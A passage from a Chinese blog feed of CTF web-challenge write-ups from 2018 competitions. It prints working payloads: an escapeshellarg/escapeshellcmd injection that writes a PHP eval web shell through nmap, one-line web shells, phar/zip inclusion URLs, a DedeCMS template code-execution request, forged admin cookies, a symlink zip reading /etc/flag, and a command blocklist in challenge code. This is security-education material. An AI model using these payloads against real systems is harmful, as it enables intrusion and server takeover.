class="variable">$sandbox</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -T5  -sT -Pn --host-timeout 2 -F  &quot;</span>.<span class="variable">$host</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只需要在要执行的恶意代码两边加上分号即可绕过。</p>
<p>并且此处需要用到<strong>nmap</strong>的<strong>-oN</strong>指令，将标准输出直接写入指定的文件。</p>
<p>先上<strong>Payload</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; &lt;?php eval($_POST[1]);?&gt; -oN shell.php &#x27;</span><br></pre></td></tr></table></figure>
<p>第一次先经过<strong>escapeshellarg</strong>函数，先对左右两边的单引号进行转义，然后分别对原单引号即现在斜杆加单引号的左右两边再次加上单引号进行字符串连接，得到如下字符串。【为直观观看特意做了空格区分。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;     \&#x27;     &#x27; -oN shell.php &#x27;     \&#x27;     &#x27;&#x27;</span><br></pre></td></tr></table></figure>
<p>然后第二次使用<strong>escapeshellcmd</strong>函数，对斜杆和单个单引号进行转义。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;     \\     &#x27;&#x27;     \&lt;\?php eval\(\$_POST\[1\]\)\;\?\&gt;     -oN     shell.php     &#x27;\\&#x27;     &#x27;&#x27;</span><br></pre></td></tr></table></figure>
<p>那么最后可以看到字符串被单引号分割成了多份，而最终指令如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -T5  -sT -Pn --host-timeout 2 -F &#x27;&#x27;     \\     &#x27;&#x27;     \&lt;\?php eval\(\$_POST\[1\]\)\;\?\&gt;     -oN     shell.php     &#x27;\\&#x27;     &#x27;&#x27;</span><br></pre></td></tr></table></figure>
<p>删除不必要的东西之后得到如下指令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -T5  -sT -Pn --host-timeout 2 -F \&lt;\?php eval\(\$_POST\[1\]\)\;\?\&gt; -oN shell.php</span><br></pre></td></tr></table></figure>
<p>即指令目的就是对<strong>&lt;?php</strong>和**eval($_POST[1]);?&gt;<strong>进行扫描，并将结果存入</strong>shell.php**。</p>
<p>通过这一指令可以将<strong>shell</strong>写入，从而连上小🐎。</p>
<p>需要一提的是<strong>mac</strong>本地用的<strong>nmap7.70</strong>和<strong>php5.5.38</strong>版本没有复现成功，可能还有别的环境的问题。</p>
<p>放在自己的<strong>vps</strong>上用<strong>nmap7.01</strong>和<strong>php5.4.16</strong>成功复现了【我就做出了这题Orz。</p>
<h3 id="黑产了解一下">黑产了解一下？</h3>
<p>赛后秒题开始<strong>XD</strong>。</p>
<p>似乎是<strong>QCTF</strong>【<strong>XMAN</strong>选拔赛的题。</p>
<p>在交易市场有<strong>9999999</strong>买<strong>flag</strong>以及<strong>5000000</strong>买<strong>hint</strong>。</p>
<p>在抽奖界面抓包会发现发送了<strong>Json</strong>数据，直接用<strong>true</strong>绕过。【我赛后翻<strong>Writeup</strong>说是有一个<strong>git</strong>泄漏代码审计发现这个弱类型判断，但是比赛的时候好像没有扫到这个<strong>git</strong>泄漏Orz。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</span><br></pre></td></tr></table></figure>
<p>似乎没有办法把钱弄到<strong>9999999</strong>，那只好买<strong>hint</strong>，需要一提的是网页上的购买<strong>hint</strong>按钮是假的，点击没有反应，只好<strong>Burpsuite</strong>发包购买。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;action&quot;:&quot;hint&quot;&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Post</strong>发送如上请求后返回一个<strong>admin pass
isQWERTYUIOPASDFGHJKL</strong>的字符串，应该是需要用这个<strong>pass</strong>的密码去注册<strong>admin</strong>账号，登陆后多了一个上传页面。</p>
<p>这儿只能上传<strong>doc</strong>和<strong>docx</strong>，测试后发现校验了后缀名、<strong>Mime</strong>、文件头。</p>
<p>且这里有一个文件包含，后缀会添加<strong>php</strong>。</p>
<p>然后由于<strong>doc</strong>和<strong>zip</strong>的文件头一样，因此构造一句话木马打包后，<strong>Burpsuite</strong>抓包修改后缀名和<strong>Mime</strong>类型上传，最后使用<strong>zip</strong>伪协议读取即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?page=zip://uploads/e65eee3bd3f975947e589d1e6ae279ccdf31fb3e.docx%23south</span><br></pre></td></tr></table></figure>
<p>其中的<strong>south</strong>是小马的名字，以及这里需要一提的是<strong>uploads</strong>这个目录下的<strong>flag</strong>是假的，这里需要使用<strong>find</strong>命令来寻找<strong>flag</strong>，最后是在<strong>/etc/flag</strong>这个路径找到<strong>flag</strong>。</p>
<h3 id="不知名的小站">不知名的小站</h3>
<p>这题在比赛的时候就发现了一个反序列化漏洞，但是没找到<strong>class</strong>函数，后来在月赛群里和师傅们聊的时候有提及说题目提示<strong>hint</strong>，<strong>hint.txt</strong>提示断电，然后联想到<strong>.hint.txt.swp</strong>，然后就有一个源码泄漏。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">verify</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$location</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$name</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;script =\&quot;JavaScript\&quot;&gt; alert(&#x27;请先登录！&#x27;);self.location=&#x27;<span class="subst">$location</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;       </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$ages</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$cmd</span>;   </span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$black_str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say_ages</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;ages;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;black_str = <span class="string">&#x27;ls| |&#123;I|;|%0a|cat|flag|find|&amp;|&lt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$check</span> = <span class="title function_ invoke__">eregi</span>(<span class="variable">$this</span>-&gt;black_str,<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$check</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$check</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">safe</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$check</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;script language=\&quot;JavaScript\&quot;&gt; alert(&#x27;您的内容含有字符非法！&#x27;); self.location=&#x27;./index.php&#x27;; &lt;/script&gt; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后在注册登陆后抓包可以看到<strong>POST</strong>了一个反序列化的字符串上去。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;info&quot;:4:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;ages&quot;;s:2:&quot;12&quot;;s:3:&quot;cmd&quot;;N;s:9:&quot;black_str&quot;;N;&#125;</span><br></pre></td></tr></table></figure>
<p>根据源码泄漏构造绕过，<strong>eregi</strong>可以使用<strong>%00</strong>截断绕过，其他内容和些许不足有错误遗漏的地方由于赛后秒题环境缺失无法复现，因此不能详细补充纠正这篇文章Orz。</p>
<h3 id="refer">Refer</h3>
<p><a
href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">谈谈escapeshellarg参数绕过和注入的问题</a></p>
<p><a
href="http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4879.html">利用/绕过
PHP escapeshellarg/escapeshellcmd函数</a></p>
<p><a href="http://v0w.top/2018/04/21/SKCTF2-wp/">SKCTF2</a></p>
<p><a
href="https://github.com/jiangsir404/Audit-Learning/blob/master/escapeshellarg%20%E5%92%8C%20escapeshellcmd%20%E5%87%BD%E6%95%B0.md">escapeshellarg
和 escapeshellcmd 函数</a></p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>反序列化</tag>
        <tag>文件包含</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>2018 全国大学生软件测试大赛 安恒杯Web测试大赛 省赛 部分题解</title>
    <url>/2018-AH-Provincial-Competition/</url>
    <content><![CDATA[<p>首发于<a
href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247485763&amp;idx=1&amp;sn=c8c511e4366a5287d0340c97ec65d6ef&amp;chksm=fbf79333cc801a25fdaf0b496007a9a002278dcad319168d70752635b4895686f2537af0bd27&amp;mpshare=1&amp;scene=23&amp;srcid=1106h6wthblgluSmnOfhR3VD#rd">安恒网络空间安全讲武堂</a>，第一次投稿，不足之处还请海涵<strong>Orz</strong>。</p>
<span id="more"></span>
<h3 id="常规操作">常规操作</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常规操作，试一试 http://114.55.36.69:8009/</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">只允许上传jpg、png、gif、rar、zip文件类型！</span><br></pre></td></tr></table></figure>
<p>看到<strong>zip</strong>于是猜测是<strong>phar://</strong>伪协议读取。</p>
<p>于是写个小马打包成<strong>zip</strong>文件传上去。</p>
<p>例如我写的是<strong>south.php</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后压缩成<strong>south.zip</strong>，那么需要访问以下链接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.55.36.69:8009/index.php?url=phar://upload/5a722d46033ecd25d5ce0f13a0e7d8ec.zip/south</span><br></pre></td></tr></table></figure>
<p>随后连接小马，读到<strong>flag{a5aa012546a729eebaeaa768883beb23}</strong>。</p>
<h3 id="送分的md5">送分的md5</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">怎么还有md5 http://114.55.36.69:8000</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5 crash?&lt;!--$_POST[&#x27;data1&#x27;]!== $_POST[&#x27;data2&#x27;]&amp;&amp;md5($_POST[&#x27;data1&#x27;])===md5($_POST[&#x27;data2&#x27;] --&gt;fail</span><br></pre></td></tr></table></figure>
<p>很简单的<strong>md5</strong>绕过，构造如下<strong>payload</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data1[]=QNKCDZO&amp;data2[]=s1091221200a</span><br></pre></td></tr></table></figure>
<p>得到<strong>flag{d9686516f1bafb5acdb3e98db62e17422}</strong>。</p>
<h3 id="a_a">!!!A_A</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!!!A_A !!!-_- http://114.55.36.69:8001/</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_error&quot;</span>, <span class="literal">false</span>);  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="variable">$str</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;A_A&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;A_A&#x27;</span>]:<span class="string">&#x27;A_A&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&quot;A_A&quot;</span>) !==<span class="literal">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,have fun&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$str</span>&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,too small&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((<span class="keyword">string</span>)<span class="variable">$str</span>&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,too big&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>); </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span> A_A,too small</span><br></pre></td></tr></table></figure>
<p>这题考过很多次了。</p>
<p>这里的知识点是当代码中存在<strong>$<em>REQUEST['user_id']<strong>里面类似的参数的时候，使用</strong>"
"、"["、"+"、"."<strong>这样的符号的时候回自动转化成</strong>"</em>"</strong>从而造成绕过。</p>
<p>例如构造一个<strong>?user_id=1&amp;user.id=2</strong>。
那么<strong>waf</strong>检测到的就是<strong>2</strong>而插入数据库的却是<strong>1</strong>。</p>
<p>而数组比所有数字都大，而字符串在强转比较的时候为<strong>0</strong>，因此构造如下<strong>payload</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?A.A[]=a</span><br></pre></td></tr></table></figure>
<p>得到<strong>flag={09bc24026c987ae44a6e424479b2e3}</strong>。</p>
<h3 id="简单文件上传">简单文件上传</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">简单文件上传，多试试 http://114.55.36.69:8015</span><br></pre></td></tr></table></figure>
<p>尝试多次，发现是检测文件头来判断文件类型，那么使用图马可以绕过上传限制。</p>
<p>命名为<strong>south.jpg.php</strong>可以成功上传。</p>
<p>提示如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uploads/17d4aa23e1d7c8cf1c176485d71effe7b35bdec3/south.peg.php succesfully uploaded！</span><br></pre></td></tr></table></figure>
<p>然后连接图马就可以读到<strong>flag{e0662bb5114da4e42b4185ed12dee2f3}</strong>。</p>
<h3 id="新的新闻搜索">新的新闻搜索</h3>
<p>这个直接用<strong>sqlmap</strong>跑<strong>post</strong>注入就可以了【因为懒得手注，也不再做过度赘述。</p>
<h3 id="真的是dedecms">真的是dedecms</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">放出来好几天的东西，随便玩玩 http://114.55.36.69:8008</span><br></pre></td></tr></table></figure>
<p><a
href="https://www.freebuf.com/vuls/164035.html">参考<strong>DedeCMS V5.7
SP2</strong>后台存在代码执行漏洞</a>。</p>
<p>后台<strong>admin</strong>弱密码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.55.36.69:8008/dede/tpl.php?action=upload</span><br></pre></td></tr></table></figure>
<p>在页面源代码中获取到<strong>token</strong>值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input name=&#x27;token&#x27; type=&#x27;hidden&#x27; value=&#x27;9ffadcfa24f99fb459bdab3cae23b0b2&#x27;  /&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.55.36.69:8008/dede/tpl.php?filename=moonsec.lib.php&amp;action=savetagfile&amp;content=%3C?php%20eval($_POST[&#x27;south&#x27;]);?%3E&amp;token=622f67f063ae730dbe33771c582ab3dd</span><br></pre></td></tr></table></figure>
<p>然后就能用如下页面连接小马。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.55.36.69:8008/include/taglib/moonsec.lib.php</span><br></pre></td></tr></table></figure>
<p>得到<strong>flag{1de3ce6607a0f95as1861c4bbb3687b8}</strong>。</p>
<h3 id="get-flag">get flag</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag在/etc/flag http://114.55.36.69:8003/</span><br></pre></td></tr></table></figure>
<p><strong>admin</strong>弱密码登陆，提示如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Welcome admin 退出查看压缩的flag. 路径为 /etc/flag</span><br></pre></td></tr></table></figure>
<p>大概是会解压传上去的压缩文件，然后读取里面的内容，于是使用<strong>ln</strong>软连接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /etc/flag test</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip -y 1.zip test</span><br></pre></td></tr></table></figure>
<p>然后上传打包后的软连接文件得到<strong>flag{1de3ce6607a0f95as1861c4bbb3687b6}</strong>。</p>
<h3 id="不一样的上传系统">不一样的上传系统</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.55.36.69:8002/</span><br></pre></td></tr></table></figure>
<p>似乎是新瓶装旧酒的原题，安恒一月月赛的题目，不再做过多赘述。</p>
<p><a
href="http://skysec.top/2018/01/22/2018%E5%AE%89%E6%81%92%E4%B8%80%E6%9C%88%E6%9C%88%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/#%E6%96%B0%E7%93%B6%E8%A3%85%E6%97%A7%E9%85%92">一叶飘零师傅的博客</a>有讲述。</p>
<p>这里抄【并改一下原话。</p>
<p><strong>Apache</strong>存在解析漏洞。<strong>Apache</strong>是从右到左开始判断解析，如果为不可识别解析，就再往左判断。</p>
<p>所以我们准备脚本<strong>south.php.png</strong>小马压缩成压缩包上传即可拿到<strong>shell</strong>，我们的<strong>png</strong>会被解析为php。</p>
<p>但是这里有一个小绕过，因为会删除带有php的文件。</p>
<p>但是这里过滤不严谨，PHP大写即可绕过，最后成功拿到shell，获得flag。</p>
<p>所以最终写小马重命名并打包上传<strong>south1.PHP.png.zip</strong>，然后得到路径。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/upload/cf417e3635d8414f1621a0e945a68702/south1.PHP.png</span><br><span class="line">/upload/cf417e3635d8414f1621a0e945a68702/__MACOSX/._south1.PHP.png</span><br></pre></td></tr></table></figure>
<p>连接就可以得到最终的<strong>flag</strong>。</p>
<h3 id="不一般的注入">不一般的注入</h3>
<p>太菜了，这题没做出来Orz。</p>
<h3 id="秘密的系统">秘密的系统</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不久前才开发的系统，功能也还不完善，代码也还有待改进 http://114.55.36.69:8014/</span><br></pre></td></tr></table></figure>
<p>看到一个<strong>Upload</strong>，点进去提示<strong>您不是管理员，无法使用此功能</strong>。</p>
<p>登陆界面也不能正常访问，习惯性的翻看<strong>robots.txt</strong>得到如下信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: index.php?r=site/loginuser_1</span><br></pre></td></tr></table></figure>
<p>于是进入登录界面。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;!--</span><br><span class="line">*** author: cib_zhinianyuxin.com</span><br><span class="line">*** code: github.com</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<p>给出了作者<strong>github</strong>的一些信息，翻看<strong>github</strong>，得到一个登陆账号密码<strong>test/cib_sec</strong>，以及<strong>cookie</strong>生成的函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secret-system</span><br><span class="line">##README.md</span><br><span class="line"></span><br><span class="line">*** author: cib_zhinianyuxin.com</span><br><span class="line"></span><br><span class="line">It&#x27;s just a system which is not completed , there are some tips:</span><br><span class="line"></span><br><span class="line">you can use test/cib_sec to login ,but you are not admin!</span><br><span class="line">only admin can upload file ,but whichone can not bypass my rules.</span><br><span class="line">/**</span><br><span class="line">$sign = array(</span><br><span class="line">                    &#x27;id&#x27;=&gt;$model-&gt;id,</span><br><span class="line">                    &#x27;name&#x27;=&gt;$model-&gt;username,</span><br><span class="line">                    &#x27;sign&#x27;=&gt;md5($model-&gt;id.$model-&gt;username),</span><br><span class="line">                );</span><br><span class="line">$_COOKIE[&#x27;cib&#x27;] = serialize($sign);</span><br><span class="line">**/</span><br></pre></td></tr></table></figure>
<p>登陆测试账号后，<strong>Google</strong>插件<strong>EditThisCookie</strong>可以查看该账号的<strong>cib
cookie</strong>是<strong>url</strong>编码的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A2%3Bs%3A4%3A%22name%22%3Bs%3A4%3A%22test%22%3Bs%3A4%3A%22sign%22%3Bs%3A32%3A%227cbab5cea99169139e7e6d8ff74ebb77%22%3B%7D</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:2:&quot;id&quot;;i:2;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:4:&quot;sign&quot;;s:32:&quot;7cbab5cea99169139e7e6d8ff74ebb77&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>解码后发现可以构造<strong>cib
cookie</strong>，改<strong>i</strong>为<strong>1</strong>，<strong>test</strong>为<strong>admin</strong>，最后的<strong>md5</strong>编码<strong>1.admin</strong>得到<strong>6c5de1b510e8bdd0bc40eff99dcd03f8</strong>，于是得到如下<strong>cookie</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:3:&#123;s:2:&quot;id&quot;;i:1;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;sign&quot;;s:32:&quot;6c5de1b510e8bdd0bc40eff99dcd03f8&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>再<strong>url</strong>编码后修改<strong>cookie</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%61%3a%33%3a%7b%73%3a%32%3a%22%69%64%22%3b%69%3a%31%3b%73%3a%34%3a%22%6e%61%6d%65%22%3b%73%3a%35%3a%22%61%64%6d%69%6e%22%3b%73%3a%34%3a%22%73%69%67%6e%22%3b%73%3a%33%32%3a%22%36%63%35%64%65%31%62%35%31%30%65%38%62%64%64%30%62%63%34%30%65%66%66%39%39%64%63%64%30%33%66%38%22%3b%7d</span><br></pre></td></tr></table></figure>
<p>然后成功升级成为管理员。</p>
<p>一个文件上传，<strong>Apache2.2.15</strong>漏洞解析，上传文件抓包改后缀名为<strong>.php.jpg</strong>。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/web/index.php?r=upload%2Fupload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>114.55.36.69:8014</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>332</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://114.55.36.69:8014</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryUAu1gUcre21NULzR</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://114.55.36.69:8014/web/index.php?r=upload%2Findex</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en,zh-CN;q=0.9,zh;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>_csrf=ZrheCWNLhMGJ84x9lHiPaGGspHQBAJU_; _csrf_name_7ace9e0d=d13170c019575cfa3f28e142a6c066ad; _csrf_name_7ace9e0d__ckMd5=1725411428d3c49a; cib=%61%3a%33%3a%7b%73%3a%32%3a%22%69%64%22%3b%69%3a%31%3b%73%3a%34%3a%22%6e%61%6d%65%22%3b%73%3a%35%3a%22%61%64%6d%69%6e%22%3b%73%3a%34%3a%22%73%69%67%6e%22%3b%73%3a%33%32%3a%22%36%63%35%64%65%31%62%35%31%30%65%38%62%64%64%30%62%63%34%30%65%66%66%39%39%64%63%64%30%33%66%38%22%3b%7d; PHPSESSID=mq4vqc5002uti92f8t4gknh9l6</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryUAu1gUcre21NULzR</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;south.php.jpg&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: text/php</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php">    @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;south&#x27;</span>]);</span></span><br><span class="line"><span class="language-php">    <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryUAu1gUcre21NULzR</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">ä¸ä¼ </span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryUAu1gUcre21NULzR--</span></span><br></pre></td></tr></table></figure>
<p>最后连马得到<strong>flag{e0662bb5114da4e42b4185ed12dee2f3}</strong>。</p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>安恒</tag>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>2018 福建省高校网络空间安全大赛 百越杯 线上初赛 部分题解</title>
    <url>/2018-BYB-Preliminary/</url>
    <content><![CDATA[<p>太菜了，只能挨打。</p>
<span id="more"></span>
<h3 id="签到">签到</h3>
<p>解数独，找个自动解题的网站就好了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">473615928</span><br><span class="line">216984753</span><br><span class="line">598237164</span><br><span class="line">651892437</span><br><span class="line">942376815</span><br><span class="line">387451296</span><br><span class="line">834529671</span><br><span class="line">125768349</span><br><span class="line">769143582</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;cee3860fb3f4a52e615fa8aaf3c91f2b&#125;</span><br></pre></td></tr></table></figure>
<h3 id="warmup">warmup</h3>
